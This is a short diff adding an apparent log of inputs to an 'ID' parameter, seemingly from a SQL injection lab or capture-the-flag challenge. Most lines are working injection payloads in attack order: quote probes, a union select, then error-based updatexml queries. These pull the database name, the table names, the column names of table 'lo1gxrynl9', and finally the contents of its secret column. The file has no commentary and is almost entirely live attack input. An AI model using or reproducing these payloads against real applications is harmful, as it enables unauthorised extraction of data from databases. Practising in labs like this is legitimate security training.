@@ -1,0 +1,20 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:1'
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1'
+ID:1"
+ID:1")-- 
+ID:1") and updatexml(1,updatexml(1,concat(0x7e,(select database()),0x7e),1),1) -- 
+ID:1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)-- 
+ID:1") and updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name="lo1gxrynl9"),10),0x7e),1) -- 
+ID:1") and updatexml(1,concat(0x7e,(select group_concat(secret_XBF4) from challenges.lo1gxrynl9),0x7e),1) -- 
